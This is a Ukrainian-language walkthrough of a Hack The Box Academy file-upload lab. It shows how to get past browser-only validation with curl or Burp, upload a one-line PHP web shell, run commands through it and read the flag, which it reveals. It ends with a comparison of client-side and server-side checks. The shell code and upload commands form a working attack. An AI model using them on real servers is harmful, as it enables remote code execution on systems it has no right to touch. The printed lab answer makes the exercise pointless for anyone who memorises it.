## File Uploads — Client-Side Validation Bypass

**Модуль:** [File Upload Attacks](https://academy.hackthebox.com/app/module/136)
**Секція:** [Client-Side Validation](https://academy.hackthebox.com/app/module/136/section/1261)
**Завдання:** Обійти клієнтську валідацію → завантажити PHP shell → прочитати `/flag.txt`
**Прапор:** `HTB{g07_my_f1r57_w3b_5h3ll}`

***

## Концепція

**Client-Side Validation** — перевірка типу/розширення файлу виконується лише у браузері (JavaScript). Сервер не валідує нічого. Достатньо обійти JS або надіслати запит напряму через `curl` — минаючи браузер повністю.

***

## Метод A — curl напряму (найпростіший)

JS-валідація живе у браузері і не впливає на прямі HTTP-запити:

```bash
TARGET="http://TARGET_IP:PORT"

echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php

curl -s -X POST "$TARGET/upload.php" \
  -F "uploadFile=@/tmp/shell.php;type=image/gif"
# File successfully uploaded
```

> `type=image/gif` — підмінюємо `Content-Type` у multipart щоб виглядало як зображення (іноді потрібно, іноді ні).

***

## Метод B — Burp Suite (якщо сервер частково перевіряє)

1. Відкриваємо upload форму у браузері
2. **Proxy → Intercept ON**
3. Обираємо будь-який `.jpg` файл → Upload
4. В Burp перехоплюємо запит → змінюємо:
   - `filename="shell.jpg"` → `filename="shell.php"`
   - Вміст файлу → `<?php system($_GET["cmd"]); ?>`
5. **Forward** → сервер приймає

***

## Крок — RCE і прапор

```bash
# Верифікація
curl -s "$TARGET/uploads/shell.php?cmd=id"
# uid=33(www-data)

# Прапор
curl -s "$TARGET/uploads/shell.php?cmd=cat+/flag.txt"
# HTB{g07_my_f1r57_w3b_5h3ll}
```

***

## Client-Side vs Server-Side Validation

| | Client-Side | Server-Side |
|---|---|---|
| Де виконується | Браузер (JS) | Сервер (PHP/Node/etc) |
| Bypass через curl | ✅ Завжди | ❌ Не завжди |
| Bypass через Burp | ✅ Завжди | Залежить від логіки |
| Реальний захист | ❌ Ні | ✅ Так |

***

## Прапор

```
HTB{g07_my_f1r57_w3b_5h3ll}
```
